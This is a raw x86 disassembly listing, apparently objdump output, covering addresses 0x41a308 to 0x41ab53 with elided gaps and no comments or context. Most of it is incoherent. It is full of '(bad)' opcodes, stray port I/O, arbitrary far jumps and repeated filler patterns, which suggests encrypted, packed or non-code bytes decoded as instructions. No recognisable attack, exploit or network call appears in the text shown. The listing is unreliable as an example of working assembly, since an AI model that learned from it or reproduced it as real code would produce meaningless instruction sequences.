  41a308:	or     al,0x26
  41a30a:	mov    DWORD PTR [ebp+0xf],ecx
  41a30d:	ja     0x41a35e
  41a30f:	sbb    ah,cl
  41a311:	int    0x7
  41a313:	jne    0x41a2b3
  41a315:	ja     0x41a35a
  41a317:	clc    
  41a318:	sub    al,0xb5
  41a31a:	or     ecx,DWORD PTR [ecx+0x0]
	...
  41a330:	add    BYTE PTR [edi+0x6],bl
  41a333:	mov    DWORD PTR [ebp-0x11],edx
  41a336:	jbe    0x41a37b
  41a338:	adc    BYTE PTR [esi],ch
  41a33a:	rcl    BYTE PTR [edi],0xb8
  41a33d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a33e:	add    al,BYTE PTR [eax]
  41a340:	add    BYTE PTR [ecx+ecx*1+0x76cf4d89],bh
  41a347:	jns    0x45cb0da7
  41a34d:	mov    edi,0x3afc4326
  41a352:	(bad)  
  41a353:	xor    al,al
  41a355:	mov    esp,0xd4b3e8fd
  41a35a:	inc    edx
  41a35b:	mov    ebp,esp
  41a35d:	cli    
  41a35e:	inc    ebp
  41a35f:	int3   
  41a360:	int3   
  41a361:	arpl   WORD PTR [edi-0x34],cx
  41a364:	int3   
  41a365:	pop    ebx
  41a366:	dec    edi
  41a367:	int3   
  41a368:	int3   
  41a369:	jae    0x41a3ba
  41a36b:	int3   
  41a36c:	int3   
  41a36d:	ror    BYTE PTR [ebp-0x47c7c14],cl
  41a373:	les    eax,FWORD PTR [ebp+0x6f]
  41a376:	add    esi,DWORD PTR [eax]
  41a378:	add    BYTE PTR [edi-0x18fcfc16],ah
  41a37e:	add    bl,BYTE PTR [edi-0x3c0504]
  41a384:	dec    edi
  41a385:	aas    
  41a386:	mov    dh,0xfb
  41a388:	inc    DWORD PTR [eax-0x7a]
  41a38b:	les    ecx,FWORD PTR [eax]
  41a38d:	cs enter 0x6af3,0xe7
  41a392:	lea    ecx,[ebx-0x8]
	...
  41a3a9:	add    dh,dl
  41a3ab:	lea    edx,[ebx]
  41a3ad:	fdivr  QWORD PTR [edx-0x3d]
  41a3b0:	dec    DWORD PTR [edx+0x6a4fb265]
  41a3b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3b7:	popa   
  41a3b8:	push   ebx
  41a3b9:	hlt    
  41a3ba:	inc    esp
  41a3bb:	aaa    
  41a3bc:	push   ebx
  41a3bd:	inc    ecx
  41a3be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3bf:	test   DWORD PTR [ebx],edi
  41a3c1:	aam    0x52
  41a3c3:	ret    
  41a3c4:	(bad)  
  41a3c5:	(bad)  
  41a3c6:	jp     0x41a3d1
  41a3c8:	mov    eax,0x2a702
  41a3cd:	jmp    0x41a41c
  41a3cf:	lea    ecx,[ebx]
  41a3d1:	add    BYTE PTR [ebp+0x6288ffc2],ah
  41a3d7:	push   edx
  41a3d8:	push   0x37200
  41a3dd:	push   0x4004a7
  41a3e2:	sub    al,0xf8
  41a3e4:	rcl    DWORD PTR [ebp+0x66],cl
  41a3e7:	add    bh,BYTE PTR [edi-0x3e]
  41a3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3eb:	add    al,0x0
  41a3ed:	add    ch,dh
  41a3ef:	push   0xffffff9e
  41a3f1:	(bad)  
  41a3f2:	cwde   
  41a3f3:	popa   
  41a3f4:	add    esp,0x2009aa3
  41a3fa:	out    0x2,eax
  41a3fc:	sub    eax,DWORD PTR [eax]
  41a3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3ff:	add    al,BYTE PTR [eax]
  41a401:	mov    ebp,DWORD PTR [edx-0x58beacca]
  41a407:	sub    eax,0x69a89c8
  41a40c:	push   esi
  41a40d:	inc    ecx
	...
  41a422:	add    BYTE PTR [edi-0xefbec73],ah
  41a428:	ret    
  41a429:	call   DWORD PTR [ecx+0x6]
  41a42c:	ss push ebx
  41a42e:	inc    ecx
  41a42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a430:	mov    dl,0x88
  41a432:	dec    ebp
  41a433:	aaa    
  41a434:	mov    bl,0xe7
  41a436:	popf   
  41a437:	cmp    esp,DWORD PTR [ecx-0x3]
  41a43a:	sub    DWORD PTR [ebx+0xe],0xffffff89
  41a43e:	adc    eax,0x3eb753
  41a443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a444:	mov    bh,0x7
  41a446:	mov    DWORD PTR [edx+0x6a],esi
  41a449:	mov    DWORD PTR [ebp-0x1],edx
  41a44c:	pusha  
  41a44d:	loop   0x41a3da
  41a44f:	add    bh,BYTE PTR [edi+0x4df3ccc0]
  41a455:	int3   
  41a456:	int3   
  41a457:	push   edx
  41a458:	(bad)  
  41a459:	in     al,dx
  41a45a:	mov    ebp,DWORD PTR [edx+0xa]
  41a45d:	cmp    DWORD PTR [ebp-0x65],eax
  41a460:	aad    0x4
  41a462:	mov    ebp,DWORD PTR [edx+0xa]
  41a465:	jmp    0x8946706f
  41a46a:	inc    ebp
  41a46b:	mov    ds:0xdbccc0bf,eax
  41a470:	dec    ebp
  41a471:	int3   
  41a472:	int3   
  41a473:	repz dec ebp
  41a475:	int3   
  41a476:	int3   
  41a477:	push   edx
  41a478:	(bad)  
  41a479:	in     al,dx
  41a47a:	add    ebx,0x2d
  41a47d:	lds    eax,FWORD PTR [ebp-0x55]
  41a480:	add    DWORD PTR [eax+0x1],esi
  41a483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a484:	mov    eax,DWORD PTR [ebx+0x8]
	...
  41a49b:	add    BYTE PTR [esi],ch
  41a49d:	(bad)  
  41a49e:	xlat   BYTE PTR ds:[ebx]
  41a49f:	mov    esp,edx
  41a4a1:	cmp    cl,BYTE PTR [ecx+0x4f039f55]
  41a4a7:	cmp    al,0x2e
  41a4a9:	mov    dh,0xdf
  41a4ab:	mov    esp,edx
  41a4ad:	bound  ecx,QWORD PTR ds:0x88f6dfb7
  41a4b3:	push   ebp
  41a4b4:	xchg   DWORD PTR [esi-0x7640f5bc],ecx
  41a4ba:	inc    ebx
  41a4bb:	call   0x40429b8f
  41a4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4c1:	mov    ecx,DWORD PTR [ebx]
  41a4c3:	cld    
  41a4c4:	repnz sar edi,0x50
  41a4c8:	dec    edi
  41a4c9:	sar    al,1
  41a4cb:	(bad)  
  41a4cc:	cmp    BYTE PTR [esp+eax*8-0x1039e1f8],al
  41a4d3:	push   0xffffffe7
  41a4d5:	jmp    0x68:0x2a72fff
  41a4dc:	xchg   edi,eax
  41a4dd:	add    DWORD PTR [eax],eax
  41a4df:	push   0xffffffa7
  41a4e1:	pop    edi
  41a4e2:	push   ebx
  41a4e3:	lock push ds
  41a4e5:	(bad)  
  41a4e6:	jecxz  0x41a473
  41a4e8:	pop    edx
  41a4e9:	bound  ecx,QWORD PTR [ecx-0x774dacbe]
  41a4ef:	dec    ebp
  41a4f0:	lahf   
  41a4f1:	mov    cl,0x88
  41a4f3:	push   ebp
  41a4f4:	add    esi,DWORD PTR [ebp+0x5fe2c1e7]
  41a4fa:	std    
  41a4fb:	and    ebx,0xe
  41a4fe:	lds    eax,FWORD PTR [ebp+0x0]
	...
  41a515:	fild   DWORD PTR [edx]
  41a517:	add    BYTE PTR [eax],al
  41a519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a51a:	imul   eax,DWORD PTR [edi],0xffffff8b
  41a51d:	push   0x56
  41a51f:	add    eax,0xf44389a6
  41a525:	sbb    al,0xce
  41a527:	fisttp WORD PTR [edi]
  41a529:	lock mov cl,0x5
  41a52c:	cmp    edx,edi
  41a52e:	push   esi
  41a52f:	jno    0x41a58a
  41a531:	sub    al,0xc5
  41a533:	out    0x83,eax
  41a535:	maskmovq mm7,mm7
  41a538:	jae    0x41a51c
  41a53a:	mov    ecx,DWORD PTR [ebx-0x18]
  41a53d:	and    al,0xd9
  41a53f:	(bad)  
  41a541:	repz push ds
  41a543:	mov    DWORD PTR [ebp+0x7f],edx
  41a546:	mov    eax,DWORD PTR [edx+0x10]
  41a549:	sbb    al,0xcd
  41a54b:	fisttp WORD PTR [ebx+0x448b1ef6]
  41a551:	mov    bh,0x5f
  41a553:	mov    DWORD PTR [ebp+0x47],ecx
  41a556:	adc    edx,edx
  41a558:	not    esi
  41a55a:	push   ds
  41a55b:	mov    DWORD PTR [ebp+0x47],edx
  41a55e:	shrd   DWORD PTR [edx+0x7b],eax,cl
  41a562:	mov    dl,0x88
  41a564:	inc    ebp
  41a565:	aas    
  41a566:	mov    ecx,DWORD PTR [ebx+0x8]
  41a569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a56a:	retf   0x5113
  41a56d:	sub    al,0xb5
  41a56f:	out    0x8b,eax
  41a571:	bound  esp,QWORD PTR [esi+0x1]
  41a574:	inc    edx
  41a575:	mov    ds:0x55e7b2,eax
	...
  41a58e:	or     bl,BYTE PTR [edi-0x3]
  41a591:	sub    ebx,0xd
  41a594:	mov    DWORD PTR [ebp+0xf],ecx
  41a597:	cmp    DWORD PTR [edi-0x1832e1d8],0xffffffeb
  41a59e:	adc    eax,0x75e4538b
  41a5a3:	push   0xe
  41a5a5:	cld    
  41a5a6:	fcomp  DWORD PTR [esi-0x7f]
  41a5a9:	les    ebp,FWORD PTR [ebx+0x670323ea]
  41a5af:	add    bl,BYTE PTR [edi-0x3ea504]
  41a5b5:	dec    edi
  41a5b6:	iret   
  41a5b7:	mov    bh,dl
  41a5b9:	push   DWORD PTR [eax+0x1e08c482]
  41a5bf:	(bad)
  41a5c2:	loop   0x41a61e
  41a5c4:	push   ebx
  41a5c5:	inc    ecx
  41a5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5c7:	add    dh,BYTE PTR [ebx+0xa]
  41a5ca:	sbb    al,0x10
  41a5cc:	lock push ebp
  41a5ce:	out    0x2,al
  41a5d0:	dec    edi
  41a5d1:	(bad)  
  41a5d2:	fidivr DWORD PTR [esi]
  41a5d4:	cmp    DWORD PTR ds:0x3eb87f,0x6a1bd7a7
  41a5de:	out    0xea,eax
  41a5e0:	jmp    FWORD PTR [edi]
  41a5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5e3:	add    cl,BYTE PTR [ecx-0x774ea4ab]
  41a5e9:	inc    ebp
  41a5ea:	inc    edi
  41a5eb:	mov    cl,BYTE PTR [eax+0x34]
  41a5ee:	neg    BYTE PTR [ebp+0x53]
  41a5f1:	lock add BYTE PTR [eax],al
	...
  41a604:	add    BYTE PTR [eax],al
  41a606:	add    BYTE PTR [edi+esi*1],al
  41a609:	push   ebx
  41a60a:	inc    ecx
  41a60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a60c:	imul   edx,DWORD PTR [ebx],0xffeae76a
  41a612:	das    
  41a613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a614:	add    cl,BYTE PTR [ecx+0x69b12355]
  41a61a:	add    BYTE PTR [eax],bl
  41a61c:	mov    eax,0xb7fba3ef
  41a621:	add    BYTE PTR ds:[eax+eiz*1],ah
  41a625:	aam    0x55
  41a627:	data16 add al,BYTE PTR [eax]
  41a62a:	jne    0x41a5be
  41a62c:	call   0x12e90e70
  41a631:	add    BYTE PTR [eax],al
  41a633:	sbb    al,0xc8
  41a635:	sti    
  41a636:	push   eax
  41a637:	dec    ebp
  41a638:	add    bh,ch
  41a63a:	push   ebp
  41a63b:	xlat   BYTE PTR ds:[ebx]
  41a63c:	mov    eax,ds:0x26655d4
  41a641:	mov    DWORD PTR [ebp-0x3d],ecx
  41a644:	mov    ecx,DWORD PTR [ebx-0x28]
  41a647:	sub    al,0xb8
  41a649:	xlat   BYTE PTR ds:[ebx]
  41a64a:	mov    esp,DWORD PTR [edx+0x3a]
  41a64d:	add    DWORD PTR [edx+0x73],eax
  41a650:	mov    eax,DWORD PTR [ebx-0x20]
  41a653:	sbb    al,0xd0
  41a655:	fisttp WORD PTR [ebx-0x74ae4d0a]
  41a65b:	loop   0x41a6c3
  41a65d:	push   eax
  41a65e:	mov    esp,DWORD PTR [edx-0x58beacca]
  41a664:	mov    bl,0xe7
  41a666:	xchg   ecx,eax
  41a667:	sbb    DWORD PTR [ebp-0x3],0xffffff83
	...
  41a67f:	add    BYTE PTR [ebx+0xe],ah
  41a682:	mov    DWORD PTR [ebp-0x79],edx
  41a685:	cmp    DWORD PTR [edx+0x2a7a4],0x891bdb00
  41a68f:	inc    ebp
  41a690:	inc    edi
  41a691:	mov    DWORD PTR [ebx-0x28],ecx
  41a694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a695:	mov    ah,BYTE PTR [eax-0x78fd5900]
  41a69b:	dec    ebp
  41a69c:	push   ebx
  41a69d:	mov    DWORD PTR [ebx-0x20],edx
  41a6a0:	push   es
  41a6a1:	ss push ebx
  41a6a3:	inc    ecx
  41a6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6a5:	sub    DWORD PTR [edx+0x34],eax
  41a6a8:	add    al,0x6
  41a6aa:	push   esi
  41a6ab:	inc    ecx
  41a6ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6ad:	mov    DWORD PTR [ebx],ecx
  41a6af:	add    al,0x71
  41a6b1:	ret    
  41a6b2:	call   DWORD PTR [eax+0x1c]
  41a6b5:	not    ebx
  41a6b7:	push   ebp
  41a6b8:	data16 add dl,BYTE PTR [edx-0x75]
  41a6bc:	push   0x6e
  41a6be:	push   eax
  41a6bf:	call   0x3eff3f
  41a6c4:	and    al,0x46
  41a6c6:	or     al,0x8b
  41a6c8:	pop    edx
  41a6c9:	bound  ecx,QWORD PTR [ecx+0x3eb6fb15]
  41a6cf:	add    BYTE PTR [ebx+esi*4-0x94576d9],ah
  41a6d6:	push   ebp
  41a6d7:	inc    ecx
  41a6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6d9:	cmp    DWORD PTR [ebx],0xffc35af8
  41a6df:	push   DWORD PTR [edx]
  41a6e1:	cs lahf 
  41a6e3:	aam    0x0
	...
  41a6f9:	pop    edx
  41a6fa:	ret    
  41a6fb:	dec    DWORD PTR [edi+0x1c]
  41a6fe:	unpcklps xmm2,XMMWORD PTR [esi-0x1a]
  41a702:	add    cl,BYTE PTR [edi-0x75]
  41a705:	mov    dl,0x52
  41a707:	push   ebx
  41a708:	inc    ecx
  41a709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a70a:	mov    al,0xe7
  41a70c:	jne    0x41a699
  41a70e:	pop    esp
  41a70f:	std    
  41a710:	sub    DWORD PTR [ebx+0xf],0xffffff9f
  41a714:	aam    0xd2
  41a716:	sar    edi,0x4f
  41a719:	jg     0x41a6df
  41a71b:	idiv   bh
  41a71d:	push   0x4c04c480
  41a722:	jecxz  0x41a78b
  41a724:	xor    al,0xa4
  41a726:	ret    0x8aff
  41a729:	mov    ds:0xa741535e,al
  41a72e:	mov    cl,0xe7
  41a730:	push   ecx
  41a731:	ds pop esp
  41a733:	std    
  41a734:	and    DWORD PTR [ebx+0xb],0xffffff87
  41a738:	inc    ebp
  41a739:	pop    ebx
  41a73a:	mov    BYTE PTR [ebx],dl
  41a73c:	aam    0xd2
  41a73e:	sar    edi,0x51
  41a741:	sub    al,0xc6
  41a743:	fisttp WORD PTR [ebx+0x415336aa]
  41a749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a74a:	inc    DWORD PTR [edi+0x28]
  41a74d:	jbe    0x41a6d6
  41a74f:	adc    esi,eax
  41a751:	pop    edx
  41a752:	sar    edi,0x51
  41a755:	movaps xmm7,xmm4
  41a758:	push   eax
  41a75a:	jg     0x41a720
  41a75c:	or     al,0x0
	...
  41a772:	inc    esi
  41a773:	push   ebx
  41a774:	push   ebx
  41a775:	inc    ecx
  41a776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a777:	add    eax,0x2a65350
  41a77c:	mov    eax,ds:0xffc1791c
  41a781:	mov    WORD PTR [edx+0x5a],ds
  41a784:	dec    edi
  41a785:	push   0x67
  41a787:	call   0xfed43291
  41a78c:	push   ebp
  41a78d:	inc    ecx
  41a78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a78f:	mov    al,0xfc
  41a791:	push   ebp
  41a792:	shr    DWORD PTR [edx-0x1e],cl
  41a795:	sti    
  41a796:	mov    al,ds:0xa701b85b
  41a79b:	add    al,BYTE PTR [eax]
  41a79d:	mov    ecx,DWORD PTR [edx-0x58fb3e43]
  41a7a3:	dec    esi
  41a7a4:	int3   
  41a7a5:	int3   
  41a7a6:	jae    0x41a7f6
  41a7a8:	int3   
  41a7a9:	int3   
  41a7aa:	rol    BYTE PTR [edi+0xaea8bec],cl
  41a7b0:	mov    DWORD PTR [eax+0x6b],eax
  41a7b3:	mov    ebp,0x4e73ccc0
  41a7b8:	int3   
  41a7b9:	int3   
  41a7ba:	repnz xchg esp,ebp
  41a7bd:	push   ebx
  41a7be:	stc    
  41a7bf:	mov    bl,0x88
  41a7c1:	cmp    eax,0x3eb547
  41a7c6:	sub    al,0xfd
  41a7c8:	jmp    0x41a81f
  41a7ca:	out    0x2,al
  41a7cc:	mov    DWORD PTR ds:0x3eb54f,esi
  41a7d2:	enter  0x58bc,0x5d
	...
  41a7ea:	add    ah,ah
  41a7ec:	dec    ebp
  41a7ed:	int3   
  41a7ee:	int3   
  41a7ef:	jb     0x41a778
  41a7f1:	in     al,dx
  41a7f2:	push   ecx
  41a7f3:	jg     0x41a7bb
  41a7f5:	add    BYTE PTR [eax-0x59],al
  41a7f8:	mov    eax,ds:0x26655fc
  41a7fd:	push   eax
  41a7fe:	call   0x3f024e
  41a803:	and    al,0x46
  41a805:	or     BYTE PTR [ecx+0x4d895e62],cl
  41a80b:	scas   eax,DWORD PTR es:[edi]
  41a80c:	mov    cl,0x69
  41a80e:	add    BYTE PTR [esi*8+0x2665617],ch
  41a815:	push   edx
  41a816:	push   DWORD PTR [edx+0x5e]
  41a819:	mov    ebp,esp
  41a81b:	bound  edi,QWORD PTR [edi]
  41a81d:	int3   
  41a81e:	int3   
  41a81f:	push   edx
  41a820:	xchg   esp,ebp
  41a822:	add    ebx,0x25
  41a825:	lds    eax,FWORD PTR [ebp-0x51]
  41a828:	add    DWORD PTR [eax],eax
  41a82a:	add    BYTE PTR [edi+0x1fdc4341],ah
  41a830:	add    eax,DWORD PTR [eax]
  41a832:	add    BYTE PTR [eax-0x40],ch
  41a835:	repz add DWORD PTR [edi-0x1538fffe],esp
  41a83c:	push   esi
  41a83d:	add    BYTE PTR [eax],al
  41a83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a840:	add    al,ch
  41a842:	inc    ebp
  41a843:	mov    eax,DWORD PTR [ebx]
  41a845:	add    BYTE PTR [eax],al
  41a847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a848:	lea    ecx,[ebx+0x8]
  41a84b:	cs or  al,dh
  41a84e:	push   ebp
	...
  41a863:	add    dh,ah
  41a865:	add    ch,al
  41a867:	test   eax,0xa1fd5a58
  41a86c:	push   edi
  41a86d:	mov    al,0x3e
  41a86f:	add    BYTE PTR [edx-0x58ff02a7],cl
  41a875:	into   
  41a876:	or     eax,edi
  41a878:	stos   BYTE PTR es:[edi],al
  41a879:	pop    edx
  41a87a:	push   ebx
  41a87b:	inc    ecx
  41a87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a87d:	add    al,BYTE PTR [eax]
  41a87f:	add    BYTE PTR [edi-0x5d38f593],ah
  41a885:	pop    edx
  41a886:	push   ebx
  41a887:	inc    ecx
  41a888:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a889:	add    eax,DWORD PTR [eax]
  41a88b:	add    BYTE PTR [edi+0x5af03b85],ah
  41a891:	ret    
  41a892:	(bad)  
  41a893:	push   DWORD PTR [edx+0xc]
  41a896:	lds    eax,FWORD PTR ds:0x3eafef
  41a89c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a89d:	add    al,BYTE PTR [eax]
  41a89f:	add    BYTE PTR [eax+ebx*1],ah
  41a8a2:	clc    
  41a8a3:	push   ebp
  41a8a4:	data16 add al,BYTE PTR [eax]
  41a8a7:	jne    0x41a84b
  41a8a9:	in     al,dx
  41a8aa:	(bad)  
  41a8ab:	(bad)  
  41a8ac:	mov    dl,0x42
  41a8ae:	push   ebx
  41a8af:	inc    ecx
  41a8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8b2:	lock push ebp
  41a8b4:	data16 add cl,BYTE PTR [ecx+0x3eafb70d]
  41a8bb:	add    BYTE PTR [esi],bl
  41a8bd:	enter  0x8be7,0xba
  41a8c1:	push   edx
  41a8c2:	push   ebx
  41a8c3:	inc    ecx
  41a8c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8c5:	lea    eax,[ebx-0x18]
	...
  41a8dc:	add    BYTE PTR [esp+eax*8+0x6ae2893b],ah
  41a8e3:	mov    DWORD PTR [ebp-0x71],ecx
  41a8e6:	mov    ecx,DWORD PTR [ebx]
  41a8e8:	(bad)  
  41a8ea:	ret    
  41a8eb:	jmp    DWORD PTR [edi-0x29]
  41a8ee:	add    eax,0xef680040
  41a8f3:	mov    edi,0xa102e655
  41a8f8:	cld    
  41a8f9:	bnd ret 
  41a8fb:	inc    esi
  41a8fd:	stos   BYTE PTR es:[edi],al
  41a8fe:	push   es
  41a8ff:	push   esi
  41a900:	inc    ecx
  41a901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a902:	iret   
  41a903:	add    BYTE PTR [eax-0x59],al
  41a906:	jmp    0x1589:0x2e7035f
  41a90d:	xor    ebp,DWORD PTR [edi+0x6ad5003e]
  41a913:	ret    0x20f7
  41a916:	pop    ecx
  41a917:	add    esp,0x5608a5af
  41a91d:	data16 add bh,ch
  41a920:	adc    eax,0x3eb09f
  41a925:	inc    esp
  41a926:	cli    
  41a927:	push   ebp
  41a928:	inc    ecx
  41a929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a92a:	mov    ds:0x266560c,eax
  41a92f:	push   eax
  41a930:	call   0x3f0168
  41a935:	and    al,0x3e
  41a937:	add    al,0x89
  41a939:	bound  edx,QWORD PTR [edx-0x77]
  41a93c:	dec    ebp
  41a93d:	xlat   BYTE PTR ds:[ebx]
  41a93e:	mov    dl,0xe7
  41a940:	aad    0x0
	...
  41a956:	leave  
  41a957:	pop    eax
  41a958:	std    
  41a959:	sub    ebx,0xfffffffd
  41a95c:	mov    al,ds:0xffc352f4
  41a961:	mov    bl,BYTE PTR [edx+0x52]
  41a964:	push   edx
  41a965:	push   0xffffffa7
  41a967:	mov    ds:0x2e655f4,eax
  41a96c:	push   eax
  41a96d:	call   0x3ef9ad
  41a972:	and    al,0x3f
  41a974:	or     al,0x8b
  41a976:	ficom  DWORD PTR [edx-0x79]
  41a979:	dec    ebp
  41a97a:	xchg   DWORD PTR [ebx+edx*2-0x10524304],ecx
  41a981:	jae    0x41a950
  41a983:	mov    eax,DWORD PTR [ebx-0x20]
  41a986:	xlat   BYTE PTR ds:[ebx]
  41a987:	mov    ecx,DWORD PTR [ebx-0x24]
  41a98a:	imul   BYTE PTR [edx-0x52]
  41a98d:	sti    
  41a98e:	pop    eax
  41a98f:	pop    eax
  41a990:	add    esp,0x5600a39f
  41a996:	out    0x2,al
  41a998:	mov    DWORD PTR ds:0x3eb0a7,edx
  41a99e:	aad    0xa1
  41a9a0:	or     al,0x56
  41a9a2:	out    0x2,al
  41a9a4:	add    DWORD PTR [ebp+0x43],eax
  41a9a7:	mov    bl,0x88
  41a9a9:	or     eax,0x3eae1b
  41a9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9af:	vsqrtsd xmm7,xmm0,xmm7
  41a9b3:	das    
  41a9b4:	idiv   edi
  41a9b6:	or     BYTE PTR [esp+eax*8+0xc],al
	...
  41a9cd:	add    BYTE PTR [eax],al
  41a9cf:	sub    al,0xae
  41a9d1:	repz add edx,DWORD PTR [edx+0x36]
  41a9d5:	add    DWORD PTR [ebp+0xb],edx
  41a9d8:	mov    dl,BYTE PTR [ebx-0x1c]
  41a9db:	sbb    al,0xbe
  41a9dd:	sti    
  41a9de:	add    ebp,DWORD PTR [edx+0x36]
  41a9e1:	xchg   DWORD PTR [ebp-0x25],eax
  41a9e4:	mov    ecx,DWORD PTR [ebx-0x20]
  41a9e7:	jl     0x41a9ee
  41a9e9:	add    BYTE PTR [esi+0x66],dl
  41a9ec:	add    al,BYTE PTR [edi-0x619438b3]
  41a9f2:	(bad)  
  41a9f3:	bound  ebx,QWORD PTR [edx+0x0]
  41a9f6:	add    BYTE PTR [edi+0x1c09e902],ah
  41a9fc:	scas   al,BYTE PTR es:[edi]
  41a9fd:	test   DWORD PTR [ebx+0x5586fe65],0xf8438b9f
  41aa07:	int3   
  41aa08:	mov    ebp,0x8bcf73ef
  41aa0d:	or     esi,esp
  41aa0f:	fcmovb st,st(1)
  41aa11:	inc    DWORD PTR [edx]
  41aa13:	jmp    0xf7ad:0xa411895a
  41aa1a:	mov    eax,ds:0x3ead73
  41aa1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa20:	mov    ebp,0x8bb789f7
  41aa25:	dec    ebx
  41aa26:	clc    
  41aa27:	es inc ecx
  41aa29:	out    0x3,eax
  41aa2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa2c:	add    cl,BYTE PTR [ecx+0x3ead3b15]
	...
  41aa46:	add    BYTE PTR [eax],al
  41aa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa49:	lods   eax,DWORD PTR ds:[esi]
  41aa4a:	div    DWORD PTR [ebx]
  41aa4c:	popf   
  41aa4d:	mov    eax,ds:0x2e655f4
  41aa52:	add    DWORD PTR [ebp+0x1f],eax
  41aa55:	mov    DWORD PTR [eax],ecx
  41aa57:	jmp    0x41aaa9
  41aa59:	mov    DWORD PTR [ebx],ebp
  41aa5b:	in     al,0x7a
  41aa5d:	sar    edi,0x88
  41aa60:	retf   0x5362
  41aa63:	inc    ecx
  41aa64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa65:	adc    eax,edi
  41aa67:	mov    DWORD PTR [edx-0x58beacc6],esi
  41aa6d:	adc    eax,edi
  41aa6f:	mov    DWORD PTR [edx-0x58beac9a],ecx
  41aa75:	push   0x4e
  41aa77:	neg    eax
  41aa79:	push   esi
  41aa7a:	mov    ecx,DWORD PTR ds:0x3ead40
  41aa80:	push   ds
  41aa81:	(bad)
  41aa84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa85:	add    al,0x40
  41aa87:	add    BYTE PTR [esi],ah
  41aa89:	imul   eax,DWORD PTR [eax],0x8902a702
  41aa8f:	push   ebp
  41aa90:	scas   eax,DWORD PTR es:[edi]
  41aa91:	sub    cl,bh
  41aa93:	mov    DWORD PTR [edx-0x58beac96],edi
  41aa99:	mov    ds:0x2e655e8,eax
  41aa9e:	push   eax
  41aa9f:	call   0x3f0347
  41aaa4:	and    al,0x3f
  41aaa6:	add    al,0x8b
  41aaa8:	stos   BYTE PTR es:[edi],al
  41aaa9:	dec    esi
  41aaaa:	push   ebx
  41aaab:	inc    ecx
	...
  41aac0:	add    BYTE PTR [edi+0x6dd5e7b3],ah
  41aac6:	push   esi
  41aac7:	std    
  41aac8:	test   DWORD PTR [edi-0x30],esp
  41aacb:	add    esi,DWORD PTR [ebx]
  41aacd:	addr16 push 0x2a
  41aad0:	mov    ecx,DWORD PTR [edx-0x58beaca2]
  41aad6:	add    esp,0xf8182404
  41aadc:	push   ebp
  41aadd:	out    0x2,al
  41aadf:	add    BYTE PTR [esi+ebx*4-0x5d],dh
  41aae3:	aam    0x55
  41aae5:	out    0x2,al
  41aae7:	xchg   DWORD PTR [ebx+ecx*8-0x2],eax
  41aaeb:	out    0x5d,eax
  41aaed:	sbb    dl,BYTE PTR [esi-0x3]
  41aaf0:	mov    edi,DWORD PTR [edx-0x58beaa12]
  41aaf6:	mov    al,0xc0
  41aaf8:	xor    esp,edi
  41aafa:	mov    ebx,esp
  41aafc:	pop    ebp
  41aafd:	in     al,0x46
  41aaff:	int3   
  41ab00:	int3   
  41ab01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab02:	add    al,BYTE PTR [eax]
  41ab04:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab0a:	add    al,BYTE PTR [eax]
  41ab0c:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab12:	add    al,BYTE PTR [eax]
  41ab14:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab1a:	add    al,BYTE PTR [eax]
  41ab1c:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab22:	add    al,BYTE PTR [eax]
	...
  41ab38:	add    BYTE PTR [eax],al
  41ab3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab3b:	add    al,BYTE PTR [eax]
  41ab3d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab43:	add    al,BYTE PTR [eax]
  41ab45:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab4b:	add    al,BYTE PTR [eax]
  41ab4d:	add    BYTE PTR [edi-0x58fffffe],ah
  41ab53:	add    al,BYTE PTR [eax]
